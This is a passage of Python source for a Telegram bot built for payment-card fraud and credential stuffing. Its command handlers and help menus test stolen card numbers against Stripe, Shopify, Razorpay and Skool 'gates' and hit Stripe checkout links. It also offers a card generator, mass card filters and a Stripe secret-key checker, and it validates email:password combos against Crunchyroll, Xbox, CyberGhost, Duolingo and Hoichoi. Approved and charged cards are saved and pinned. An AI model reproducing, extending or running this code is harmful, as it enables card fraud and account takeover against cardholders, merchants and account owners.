        f"\U0001f4c4 **TXT File CC Limits:**\n"
        f"\U0001f451 Admin \u2014 **Unlimited**\n"
        f"\u2b50 Premium \u2014 **3,000** cards\n"
        f"\U0001f539 Free \u2014 **1,000** cards"
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Gates", b"menu_gates")]
    ])


@client.on(events.CallbackQuery(data=b"back_main"))
async def back_main_cb(event):
    await start(event)


@client.on(events.NewMessage(pattern=r'(?i)^[/](help|setup|gatesetup)$'))
async def help_setup_cmd(event):
    await register_user(event.sender_id)
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())

    is_admin = event.sender_id in ADMIN_ID
    sep = "\u2500" * 26

    text = (
        f"\U0001f4d6 **GATEWAY SETUP GUIDE**\n"
        f"{sep}\n\n"
        f"Tap a category below to see\n"
        f"how to add & remove sites/keys.\n"
    )

    buttons = [
        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
        [Button.inline("\U0001f4b3 Razorpay", b"help_razorpay"), Button.inline("\U0001f512 Skool Gate", b"help_skool")],
        [Button.inline("\U0001f4b0 Stripe Checkout", b"help_checkout"), Button.inline("\U0001f50d Tools", b"help_tools")],
    ]
    if is_admin:
        buttons.append([Button.inline("\U0001f451 Admin Commands", b"help_admin")])
    buttons.append([Button.inline("\u25c0 Back to Menu", b"back_main")])

    await event.reply(text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"help_stripe"))
async def help_stripe_cb(event):
    is_admin = event.sender_id in ADMIN_ID
    sep = "\u2500" * 26

    text = (
        f"\u26a1 **STRIPE GATES SETUP**\n"
        f"{sep}\n\n"
        f"**1. Stripe PK Auth** (`/st`)\n"
        f"Fast $0 card validation using PK key.\n\n"
    )
    if is_admin:
        text += (
            f"\u2795 **Add:** `/addpk <pk_live_xxx> [sk_live_xxx]`\n"
            f"  SK is optional (enables full auth)\n"
            f"\U0001f4cb **View:** `/viewpk`\n\n"
        )
    else:
        text += f"\U0001f4cb **View current:** `/viewpk`\n\n"

    text += (
        f"{sep}\n"
        f"**2. Stripe Charge** (`/charge`)\n"
        f"SK-based charge gate (configurable $).\n\n"
    )
    if is_admin:
        text += (
            f"\u2795 **Add:** `/addsk <sk_live_xxx> [amount_cents]`\n"
            f"  Default: 50 cents ($0.50)\n"
            f"  Example: `/addsk sk_live_abc 100` = $1.00\n"
            f"\U0001f4cb **View:** `/viewsk`\n\n"
        )
    else:
        text += f"\U0001f4cb **View current:** `/viewsk`\n\n"

    text += (
        f"{sep}\n"
        f"**3. Skool Stripe** (`/skl /skl1 /skl2`)\n"
        f"Uses Skool accounts for Stripe checks.\n\n"
        f"\u2795 **Add:** `/addskool email:pass`\n"
        f"\u2796 **Remove:** `/rmskool email`\n"
        f"\U0001f4cb **View:** `/viewskool`\n"
    )

    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_shopify"))
async def help_shopify_cb(event):
    sep = "\u2500" * 26
    text = (
        f"\U0001f310 **SHOPIFY SETUP**\n"
        f"{sep}\n\n"
        f"**Commands:** `/sh` `/shp`\n"
        f"Check cards via Shopify checkout.\n\n"
        f"{sep}\n"
        f"**Site Management:**\n\n"
        f"\u2795 **Add site:**\n"
        f"  `/addsite site1.com site2.com`\n"
        f"  Or reply to a `.txt` file with `/addsite`\n\n"
        f"\U0001f4cb **View your sites:**\n"
        f"  `/viewsite`\n\n"
        f"\u2796 **Remove site:**\n"
        f"  `/rmsite site1.com site2.com`\n\n"
        f"\U0001f5d1 **Remove all sites:**\n"
        f"  `/removeall`\n\n"
        f"{sep}\n"
        f"\U0001f4a1 Add multiple Shopify sites for\n"
        f"better reliability and speed."
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_razorpay"))
async def help_razorpay_cb(event):
    is_admin = event.sender_id in ADMIN_ID
    sep = "\u2500" * 26
    text = (
        f"\U0001f4b3 **RAZORPAY SETUP**\n"
        f"{sep}\n\n"
        f"**Command:** `/rz`\n"
        f"Pure HTTP card validation via Razorpay.\n\n"
        f"{sep}\n"
    )
    if is_admin:
        text += (
            f"\u2795 **Add site:**\n"
            f"  `/addrzsite <url> [amount]`\n"
            f"  Example: `/addrzsite https://razorpay.me/pay/abc 100`\n"
            f"  Amount is in INR (default: 100)\n\n"
            f"\u2796 **Remove site:**\n"
            f"  `/rmrzsite`\n\n"
        )
    text += (
        f"\U0001f4cb **View current site:**\n"
        f"  `/rzsite`\n"
    )
    if not is_admin:
        text += f"\n\U0001f512 Only admins can change the site."

    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])




@client.on(events.CallbackQuery(data=b"help_skool"))
async def help_skool_cb(event):
    sep = "\u2500" * 26
    text = (
        f"\U0001f512 **SKOOL GATE SETUP**\n"
        f"{sep}\n\n"
        f"**Commands:** `/skl` `/skl1` `/skl2`\n"
        f"Stripe checks via Skool platform.\n\n"
        f"{sep}\n"
        f"**Account Management:**\n\n"
        f"\u2795 **Add account:**\n"
        f"  `/addskool email:password`\n\n"
        f"\u2796 **Remove account:**\n"
        f"  `/rmskool email`\n\n"
        f"\U0001f4cb **View accounts:**\n"
        f"  `/viewskool`\n\n"
        f"{sep}\n"
        f"\U0001f4a1 Create account at **skool.com**\n"
        f"then add it here. More accounts\n"
        f"= faster checking speed."
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_checkout"))
async def help_checkout_cb(event):
    sep = "\u2500" * 26
    text = (
        f"\U0001f4b0 **STRIPE CHECKOUT HITTER**\n"
        f"{sep}\n\n"
        f"**Command:** `/co`\n"
        f"Hit any Stripe checkout link with CCs.\n\n"
        f"{sep}\n"
        f"**Usage:**\n\n"
        f"`/co <cards> <checkout_url>`\n\n"
        f"**Example:**\n"
        f"`/co 4111111111111111|12|25|123`\n"
        f"`4222222222222222|06|26|456`\n"
        f"`https://checkout.stripe.com/xxx`\n\n"
        f"{sep}\n"
        f"\U0001f4a1 No setup needed! Just provide\n"
        f"a valid Stripe checkout link."
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_tools"))
async def help_tools_cb(event):
    sep = "\u2500" * 26
    text = (
        f"\U0001f50d **TOOLS & UTILITIES**\n"
        f"{sep}\n\n"
        f"\u25cf `/url <site>` \u2014 Gateway Analyzer\n"
        f"  Detect payment gateways on any site\n\n"
        f"\u25cf `/findsite <gateway> [count]`\n"
        f"  Find sites using a specific gateway\n"
        f"  Example: `/findsite stripe 10`\n\n"
        f"\u25cf `/bin <bin>` \u2014 BIN Lookup\n"
        f"\u25cf `/gen <bin>` \u2014 CC Generator\n"
        f"\u25cf `/rand <country>` \u2014 Address Gen\n"
        f"\u25cf `/fl` \u2014 CC Extractor (text/file)\n"
        f"\u25cf `/filter` \u2014 CC Filter (reply .txt)\n"
        f"\u25cf `/sk <sk_live>` \u2014 SK Key Check\n"
        f"\u25cf `/skc` \u2014 Mass SK Checker\n"
        f"\u25cf `/tr <lang> <text>` \u2014 Translate\n"
        f"\u25cf `/ping` \u2014 Bot latency test"
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_admin"))
async def help_admin_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Admin only.", alert=True)
    sep = "\u2500" * 26
    text = (
        f"\U0001f451 **ADMIN COMMANDS**\n"
        f"{sep}\n\n"
        f"**Gateway Setup (Add/Remove):**\n"
        f"\u25cf `/addpk <pk> [sk]` \u2014 Stripe PK Auth\n"
        f"\u25cf `/addsk <sk> [cents]` \u2014 Stripe Charge\n"
        f"\u25cf `/addrzsite <url> [amt]` \u2014 Razorpay\n"
        f"\u25cf `/rmrzsite` \u2014 Remove Razorpay site\n"
        f"**View Config:**\n"
        f"\u25cf `/viewpk` \u2014 Stripe PK config\n"
        f"\u25cf `/viewsk` \u2014 Stripe Charge config\n"
        f"\u25cf `/rzsite` \u2014 Razorpay config\n\n"
        f"**User Management:**\n"
        f"\u25cf `/auth <id>` \u2014 Authorize user\n"
        f"\u25cf `/unauth <id>` \u2014 Revoke access\n"
        f"\u25cf `/prem <id>` \u2014 Grant premium\n"
        f"\u25cf `/unprem <id>` \u2014 Remove premium\n"
        f"\u25cf `/ban <id>` \u2014 Ban user\n"
        f"\u25cf `/unban <id>` \u2014 Unban user\n"
        f"\u25cf `/users` \u2014 List all users\n\n"
        f"**Bot Control:**\n"
        f"\u25cf `/on <gate>` / `/off <gate>` \u2014 Toggle gate\n"
        f"\u25cf `/setproxy` \u2014 Proxy settings\n"
        f"\u25cf `/stats` \u2014 Bot statistics\n"
        f"\u25cf `/broadcast <msg>` \u2014 Message all"
    )
    await event.edit(text, buttons=[
        [Button.inline("\u25c0 Back to Setup", b"help_back")]
    ])


@client.on(events.CallbackQuery(data=b"help_back"))
async def help_back_cb(event):
    is_admin = event.sender_id in ADMIN_ID
    sep = "\u2500" * 26
    text = (
        f"\U0001f4d6 **GATEWAY SETUP GUIDE**\n"
        f"{sep}\n\n"
        f"Tap a category below to see\n"
        f"how to add & remove sites/keys.\n"
    )
    buttons = [
        [Button.inline("\u26a1 Stripe Gates", b"help_stripe"), Button.inline("\U0001f310 Shopify", b"help_shopify")],
        [Button.inline("\U0001f4b3 Razorpay", b"help_razorpay"), Button.inline("\U0001f512 Skool Gate", b"help_skool")],
        [Button.inline("\U0001f4b0 Stripe Checkout", b"help_checkout"), Button.inline("\U0001f50d Tools", b"help_tools")],
    ]
    if is_admin:
        buttons.append([Button.inline("\U0001f451 Admin Commands", b"help_admin")])
    buttons.append([Button.inline("\u25c0 Back to Menu", b"back_main")])
    await event.edit(text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"noop"))
async def noop_cb(event):
    await event.answer()

@client.on(events.CallbackQuery(pattern=rb"^mass_stop_"))
async def mass_stop_cb(event):
    user_id = int(event.data.decode().replace("mass_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this check.", alert=True)
    if user_id in ACTIVE_MASS_PROCESSES:
        del ACTIVE_MASS_PROCESSES[user_id]
        await event.answer("Stopping mass check...", alert=True)
    else:
        await event.answer("No active mass check found.", alert=True)

@client.on(events.CallbackQuery(pattern=rb"^mtxt_stop_"))
async def mtxt_stop_cb(event):
    user_id = int(event.data.decode().replace("mtxt_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this check.", alert=True)
    if user_id in ACTIVE_MTXT_PROCESSES:
        del ACTIVE_MTXT_PROCESSES[user_id]
        await event.answer("Stopping mass check...", alert=True)
    else:
        await event.answer("No active mass check found.", alert=True)

@client.on(events.CallbackQuery(pattern=rb"^mst_stop_"))
async def mst_stop_cb(event):
    user_id = int(event.data.decode().replace("mst_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this check.", alert=True)
    if user_id in ACTIVE_MST_PROCESSES:
        del ACTIVE_MST_PROCESSES[user_id]
        await event.answer("Stopping mass Stripe check...", alert=True)
    else:
        await event.answer("No active mass Stripe check found.", alert=True)

@client.on(events.CallbackQuery(pattern=rb"^mpp_stop_"))
async def mpp_stop_cb(event):
    user_id = int(event.data.decode().replace("mpp_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this check.", alert=True)
    if user_id in ACTIVE_MPP_PROCESSES:
        del ACTIVE_MPP_PROCESSES[user_id]
        await event.answer("Stopping mass PayPal check...", alert=True)
    else:
        await event.answer("No active mass PayPal check found.", alert=True)

@client.on(events.CallbackQuery(pattern=rb"^msktxt_stop_"))
async def msktxt_stop_cb(event):
    user_id = int(event.data.decode().replace("msktxt_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this check.", alert=True)
    if user_id in ACTIVE_MSKTXT_PROCESSES:
        del ACTIVE_MSKTXT_PROCESSES[user_id]
        await event.answer("Stopping mass SK check...", alert=True)
    else:
        await event.answer("No active mass SK check found.", alert=True)

_broadcast_pending: set = set()

async def _do_broadcast(reply_target, message_obj=None, text_only: str = ""):
    users = await load_json(USERS_FILE)
    user_ids = list(users.keys())
    total = len(user_ids)
    sent = failed = 0
    prog = await reply_target.reply(f"📡 Broadcasting to {total} users...\n⏳ 0/{total}")
    for i, user_id in enumerate(user_ids, 1):
        try:
            if message_obj:
                await asyncio.wait_for(client.send_message(int(user_id), message_obj), timeout=8)
            else:
                await asyncio.wait_for(client.send_message(int(user_id), text_only), timeout=8)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
        if i % 100 == 0 or i == total:
            try:
                await prog.edit(
                    f"📡 Broadcasting to {total} users...\n"
                    f"⏳ {i}/{total} — ✅ {sent} sent, ❌ {failed} failed"
                )
            except Exception:
                pass
    try:
        await prog.edit(
            f"✅ **Broadcast complete!**\n"
            f"📨 Sent: **{sent}** / {total}\n"
            f"❌ Failed: **{failed}**"
        )
    except Exception:
        await reply_target.reply(f"✅ Broadcast done — Sent: {sent}/{total} | Failed: {failed}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]broadcast(?:\s+([\s\S]+))?$'))
async def broadcast_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ Admin only.")
    inline_text = (event.pattern_match.group(1) or "").strip()
    if inline_text:
        await _do_broadcast(event, text_only=inline_text)
        return
    _broadcast_pending.add(event.sender_id)
    await event.reply(
        "📣 **Broadcast Mode**\n\n"
        "Send the message you want to broadcast to all users.\n"
        "_(Supports text, photos, videos, files)_"
    )

@client.on(events.NewMessage(from_users=list(ADMIN_ID) if ADMIN_ID else []))
async def broadcast_collect(event):
    if event.sender_id not in _broadcast_pending:
        return
    if event.text and event.text.startswith('/'):
        _broadcast_pending.discard(event.sender_id)
        return
    _broadcast_pending.discard(event.sender_id)
    await _do_broadcast(event, message_obj=event.message)

@client.on(events.CallbackQuery(data=b"broadcast_start"))
async def broadcast_start(event):
    if event.sender_id not in ADMIN_ID: return
    await event.answer()
    _broadcast_pending.add(event.sender_id)
    await event.reply(
        "📣 **Broadcast Mode**\n\n"
        "Send the message you want to broadcast to all users.\n"
        "_(Supports text, photos, videos, files)_"
    )


@client.on(events.NewMessage(pattern=r'(?i)^[/]admin$'))
async def admin_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Access Denied!")

    users = await load_json(USERS_FILE)
    premium = await load_json(PREMIUM_FILE)
    banned = await load_json(BANNED_FILE)
    sep = "\u2500" * 24

    text = (
        f"\U0001f6e1 **ADMIN PANEL**\n{sep}\n\n"
        f"\U0001f4ca **Stats:**\n"
        f"  \u25cf Total Users: **{len(users)}**\n"
        f"  \u25cf Premium: **{len(premium)}**\n"
        f"  \u25cf Banned: **{len(banned)}**\n\n"
        f"{sep}\n"
        f"**User Management:**\n"
        f"`/auth <id> <days>` \u2014 Grant premium\n"
        f"`/ban <id>` \u2014 Ban user\n"
        f"`/unban <id>` \u2014 Unban user\n\n"
        f"**Bot Management:**\n"
        f"`/broadcast` \u2014 Message all users\n"
        f"`/setproxy` \u2014 Set proxy\n"
        f"`/stopmass` \u2014 Stop mass check\n\n"
        f"**Gateway Control:**\n"
        f"`/on <gate>` \u2014 Enable gateway\n"
        f"`/off <gate>` \u2014 Disable gateway\n\n"
        f"**Razorpay:**\n"
        f"`/addrzsite <url> [amount]` \u2014 Set RZ site\n"
        f"`/rzsite` \u2014 View current RZ site\n\n"
        f"**Stripe Auth:**\n"
        f"`/addpk <pk_live_xxx> [sk_live_xxx]` \u2014 Set PK/SK keys\n"
        f"`/viewpk` \u2014 View current PK config\n\n"
        f"**Stripe Charge:**\n"
        f"`/addsk <sk_live_xxx> [amount_cents]` \u2014 Set SK + amount (default 50 = $0.50)\n"
        f"`/viewsk` \u2014 View current charge SK config"
    )
    await event.reply(text)


@client.on(events.NewMessage(pattern=r'(?i)^[/]addrzsite\b'))
async def add_rzsite_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only admins can set the Razorpay site.")
    parts = event.raw_text.split(None, 2)
    if len(parts) < 2:
        return await event.reply("**Format:** `/addrzsite <razorpay.me URL> [amount]`\n\nExample: `/addrzsite https://razorpay.me/pay/123abc 100`")
    url = parts[1].strip()
    amount = parts[2].strip() if len(parts) >= 3 else "100"
    if not url.startswith("http"):
        url = "https://" + url
    from gates.razorpay import set_razorpay_site
    set_razorpay_site(url, amount)
    await event.reply(f"Razorpay site set!\n\n**URL:** `{url}`\n**Amount:** {amount} INR\n\nUsers can now use `/rz` to check cards.")


@client.on(events.NewMessage(pattern=r'(?i)^[/]rzsite\b'))
async def rzsite_info_cmd(event):
    from gates.razorpay import get_razorpay_site
    site_url, amount = get_razorpay_site()
    if site_url:
        await event.reply(f"**Current Razorpay Site:**\n`{site_url}`\n**Amount:** {amount} INR")
    else:
        await event.reply("No Razorpay site configured.\n\nAdmin can set one with `/addrzsite <url> [amount]`")


@client.on(events.NewMessage(pattern=r'(?i)^[/](rmrzsite|removerzsite|delrzsite)$'))
async def rm_rzsite_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only admins can remove the Razorpay site.")
    from gates.razorpay import get_razorpay_site, remove_razorpay_site
    site_url, _ = get_razorpay_site()
    if not site_url:
        return await event.reply("No Razorpay site is configured.")
    remove_razorpay_site()
    await event.reply(f"Razorpay site removed!\n\n**Was:** `{site_url}`\n\n`/rz` gate is now disabled until a new site is added with `/addrzsite`.")



@client.on(events.NewMessage(pattern=r'(?i)^[/]addpk\b'))
async def add_pk_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only admins can set the PK/SK keys.")
    parts = event.raw_text.split(None, 2)
    if len(parts) < 2:
        return await event.reply("**Format:** `/addpk <pk_live_xxx> [sk_live_xxx]`\n\nThe SK is optional but enables full auth (SetupIntent).\nWithout SK, only PM-based validation is used.")
    pk = parts[1].strip()
    sk = parts[2].strip() if len(parts) >= 3 else ""
    if not pk.startswith("pk_"):
        return await event.reply("Invalid PK key. Must start with `pk_live_` or `pk_test_`")
    from gates.stripe_auth import set_pk_key
    set_pk_key(pk, sk)
    mode = "PK + SK (Full Auth)" if sk else "PK Only (PM Validation)"
    await event.reply(f"Stripe Auth keys set!\n\n**PK:** `{pk[:20]}...`\n**Mode:** {mode}\n\nUsers can now use `/st` to check cards.")


@client.on(events.NewMessage(pattern=r'(?i)^[/]viewpk\b'))
async def viewpk_cmd(event):
    from gates.stripe_auth import get_pk_key
    pk, sk = get_pk_key()
    if pk:
        mode = "PK + SK (Full Auth)" if sk else "PK Only (PM Validation)"
        await event.reply(f"**Stripe Auth Config:**\n**PK:** `{pk[:20]}...`\n**SK:** `{'Set' if sk else 'Not Set'}`\n**Mode:** {mode}")
    else:
        await event.reply("No Stripe Auth key configured.\n\nAdmin can set one with `/addpk <pk_live_xxx> [sk_live_xxx]`")


@client.on(events.NewMessage(pattern=r'(?i)^[/]addadnpk\b'))
async def add_adn_pk_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only admins can set the Adyen Auth PK key.")
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await event.reply("**Format:** `/addadnpk <pk_live_xxx>`\n\nSets the Stripe PK key used by the Adyen Auth gate (`/adn`).")
    pk = parts[1].strip()
    if not pk.startswith("pk_"):
        return await event.reply("Invalid PK key. Must start with `pk_live_` or `pk_test_`")
    from gates.adyen_auth import set_adn_pk
    set_adn_pk(pk)
    await event.reply(f"Adyen Auth PK key set!\n\n**PK:** `{pk[:20]}...`\n\nUsers can now use `/adn` to check cards.")


@client.on(events.NewMessage(pattern=r'(?i)^[/]addsk\b'))
async def add_sk_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only admins can set the charge SK key.")
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await event.reply("**Format:** `/addsk <sk_live_xxx> [amount_in_cents]`\n\nAmount defaults to 50 ($0.50).\nExample: `/addsk sk_live_abc123 100` for $1.00 charge")
    sk = parts[1].strip()
    amount = 50
    if len(parts) >= 3:
        try:
            amount = int(parts[2].strip())
            if amount <= 0:
                return await event.reply("Amount must be a positive number (in cents). Example: `50` = $0.50, `100` = $1.00")
        except ValueError:
            return await event.reply("Amount must be a number (in cents). Example: `50` = $0.50, `100` = $1.00")
    if not sk.startswith("sk_"):
        return await event.reply("Invalid SK key. Must start with `sk_live_` or `sk_test_`")
    from gates.stripe_charge import set_charge_sk
    set_charge_sk(sk, amount)
    await event.reply(f"Stripe Charge SK set!\n\n**SK:** `{sk[:20]}...`\n**Amount:** ${amount / 100:.2f} ({amount} cents)\n\nUsers can now use `/charge` to check cards.")


@client.on(events.NewMessage(pattern=r'(?i)^[/]viewsk\b'))
async def viewsk_cmd(event):
    from gates.stripe_charge import get_charge_sk
    sk, amount = get_charge_sk()
    if sk:
        await event.reply(f"**Stripe Charge Config:**\n**SK:** `{sk[:20]}...`\n**Amount:** ${amount / 100:.2f} ({amount} cents)")
    else:
        await event.reply("No Stripe Charge SK configured.\n\nAdmin can set one with `/addsk <sk_live_xxx> [amount_cents]`")


@client.on(events.NewMessage(pattern=r'(?i)^[/\.]acc\b'))
async def acc_checker_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    allowed, remaining = check_cooldown(event.sender_id)
    if not allowed:
        return await event.reply(f"Cooldown: wait {remaining}s")

    parts = event.raw_text.split(None, 2)
    if len(parts) < 3:
        return await event.reply(
            "**Usage:** `/acc <checker> <email:password>`\n\n"
            "**Checkers:**\n"
            "\u25cf `cr` \u2014 Crunchyroll\n"
            "\u25cf `xbox` \u2014 Xbox Game Pass\n"
            "\u25cf `cg` \u2014 CyberGhost VPN\n"
            "\u25cf `duo` \u2014 Duolingo\n"
            "\u25cf `hoi` \u2014 Hoichoi\n\n"
            "**Example:** `/acc cr email@test.com:password123`"
        )

    checker_alias = parts[1].lower()
    combo = parts[2].strip()

    alias_map = {
        "cr": "crunchyroll", "crunchyroll": "crunchyroll", "crunchy": "crunchyroll",
        "xbox": "xbox", "xb": "xbox", "gamepass": "xbox",
        "cg": "cyberghost", "cyberghost": "cyberghost", "cyber": "cyberghost",
        "duo": "duolingo", "duolingo": "duolingo", "dl": "duolingo",
        "hoi": "hoichoi", "hoichoi": "hoichoi",
    }

    checker_type = alias_map.get(checker_alias)
    if not checker_type:
        return await event.reply(
            f"Unknown checker: `{checker_alias}`\n\n"
            "Use: `cr`, `xbox`, `cg`, `duo`, or `hoi`"
        )

    combo_err = validate_combo(combo)
    if combo_err:
        return await event.reply(combo_err)

    user_part, pass_part = combo.split(":", 1)
    if not user_part.strip() or not pass_part.strip():
        return await event.reply("Both email and password are required.")

    from gates.account_checkers import SUPPORTED_CHECKERS
    checker_label = SUPPORTED_CHECKERS.get(checker_type, checker_type)

    loading_msg = await event.reply(f"\u25e0 Checking **{checker_label}**...")

    try:
        from gates.account_checkers import run_check
        proxy = get_user_proxy(event.sender_id)

        result = await asyncio.get_event_loop().run_in_executor(
            None, run_check, checker_type, user_part.strip(), pass_part.strip(), proxy
        )

        status = result.get("status", "error")
        capture = result.get("capture", {})
        message_text = result.get("message", "")

        sep = "\u2500" * 24

        if status == "error":
            text = f"\u274c **{checker_label} Check Failed**\n{sep}\n\n{message_text}"
        elif status == "HIT":
            cap_lines = "\n".join([f"\u25cf **{k}:** `{v}`" for k, v in capture.items() if v and v != "N/A"])
            text = (
                f"\U0001f7e2 **{checker_label} HIT FOUND**\n{sep}\n\n"
                f"\U0001f464 `{user_part.strip()}`\n"
                f"\U0001f511 `{pass_part.strip()}`\n\n"
                f"{cap_lines or 'Premium/Active Account'}"
            )
        elif status == "FREE":
            cap_lines = "\n".join([f"\u25cf **{k}:** `{v}`" for k, v in capture.items() if v and v != "N/A"])
            text = (
                f"\U0001f535 **{checker_label} FREE ACCOUNT**\n{sep}\n\n"
                f"\U0001f464 `{user_part.strip()}`\n"
                f"\U0001f511 `{pass_part.strip()}`\n\n"
                f"{cap_lines or 'No active subscription'}"
            )
        elif status == "CUSTOM":
            cap_lines = "\n".join([f"\u25cf **{k}:** `{v}`" for k, v in capture.items() if v and v != "N/A"])
            text = (
                f"\U0001f7e1 **{checker_label} CUSTOM**\n{sep}\n\n"
                f"\U0001f464 `{user_part.strip()}`\n\n"
                f"{cap_lines or 'Special status'}"
            )
        elif status == "2FA":
            text = (
                f"\U0001f7e3 **{checker_label} 2FA REQUIRED**\n{sep}\n\n"
                f"\U0001f464 `{user_part.strip()}`\n"
                f"Account has 2FA enabled."
            )
        elif status == "FAIL":
            text = f"\U0001f534 **{checker_label} FAIL**\n{sep}\n\nInvalid credentials."
        else:
            text = f"\u2753 **{checker_label}** \u2014 Status: {status}"

        try:
            await loading_msg.edit(text)
        except Exception:
            await event.reply(text)

    except Exception as e:
        try:
            await loading_msg.edit(f"\u274c **{checker_label} Error:** {str(e)[:100]}")
        except Exception:
            await event.reply(f"\u274c **{checker_label} Error:** {str(e)[:100]}")


@client.on(events.NewMessage(pattern=r'(?i)^[/\.]chk\b'))
async def chk_combined_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    allowed, remaining = check_cooldown(event.sender_id)
    if not allowed:
        return await event.reply(f"Cooldown: wait {remaining}s")

    remaining_text = event.raw_text.split(None, 1)[1].strip() if len(event.raw_text.split(None, 1)) > 1 else ""

    card_data = None
    if remaining_text:
        card_data = parse_card_input(remaining_text)
    if not card_data and event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card_data = parse_card_input(replied_msg.text)
            if not card_data:
                cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
                found_in_reply = cc_pattern.findall(replied_msg.text)
                if found_in_reply:
                    card_data = parse_card_input(found_in_reply[0])
    if not card_data:
        return await event.reply("**Usage:** `/chk 4111111111111111|12|25|123`\n\nRuns card through CharityWater + Razorpay simultaneously.")

    cc, mm, yy, cvv = card_data

    card_err = validate_card_parts(cc, mm, yy, cvv)
    if card_err:
        return await event.reply(card_err)
    if not checkLuhn(cc):
        return await event.reply("❌ Invalid card number (Luhn check failed).")
    if is_bin_banned(cc):
        return await event.reply("❌ This BIN is banned.")

    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)

    loading_msg = await event.reply("\u25e0 Checking on **Multi-Gate**...")

    loading_task = asyncio.create_task(_animate_loading(loading_msg, "Multi-Gate"))

    try:
        gates_to_run = [
            ("cw", "Stripe Charge $6"),
            ("rz", "Razorpay Auth"),
        ]

        active_gates = [(alias, name) for alias, name in gates_to_run if is_gateway_on(alias) or event.sender_id in ADMIN_ID]

        if not active_gates:
            loading_task.cancel()
            try: await loading_msg.delete()
            except: pass
            return await event.reply("No gates available for combined check.")

        start_time = time.time()
        tasks = []
        for alias, name in active_gates:
            tasks.append(run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = round(time.time() - start_time, 2)

        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        cc_str = f"{cc}|{mm}|{yy}|{cvv}"
        info_str = f"{brand} - {bin_type} - {level}".upper()

        result_lines = []
        best_status = "DECLINED"
        for i, (alias, name) in enumerate(active_gates):
            resp = results[i] if not isinstance(results[i], Exception) else f"Error - {str(results[i])[:50]}"
            resp = str(resp) if resp else "No response"
            status = classify_response(resp)
            resp_clean = clean_response(resp)

            if status == "CHARGED":
                icon = "\U0001f525"
                best_status = "CHARGED"
                await save_approved_card(cc_str, "CHARGED", resp_clean, name, "-", event.sender_id, first_name)
            elif status == "APPROVED":
                icon = "\u2705"
                if best_status != "CHARGED":
                    best_status = "APPROVED"
                await save_approved_card(cc_str, "APPROVED", resp_clean, name, "-", event.sender_id, first_name)
            elif status == "DECLINED":
                icon = "\u274c"
            else:
                icon = "\u26a0"

            result_lines.append(f"{icon} **{name}:** {resp_clean}")

        user_proxy = get_user_proxy(event.sender_id)
        p_status = "Live" if user_proxy else "Not Set"

        sep = "\u2500" * 24
        msg = f"**Combined Check**\n{sep}\n"
        msg += f"**Card:** `{cc_str}`\n\n"
        msg += "\n".join(result_lines)
        msg += f"\n\n{sep}\n"
        msg += f"**Info** \u21e8 {info_str}\n"
        msg += f"**Issue** \u21e8 {bank} \U0001f3db\n"
        msg += f"**Country** \u21e8 {country} {flag}\n"
        msg += f"\n**Time:** {elapsed}s\n"
        msg += f"**Checked By:** [{first_name}](tg://user?id={event.sender_id})\n"
        msg += f"\U0001f310 **Proxy** \u00bb {p_status}"

        loading_task.cancel()
        try: await loading_msg.delete()
        except: pass
        result_msg = await event.reply(msg)
        if best_status == "CHARGED":
            await pin_charged_message(event, result_msg)
        if event.is_group:
            asyncio.create_task(auto_delete_message(result_msg))
    except Exception as e:
        loading_task.cancel()
        try: await loading_msg.delete()
        except: pass
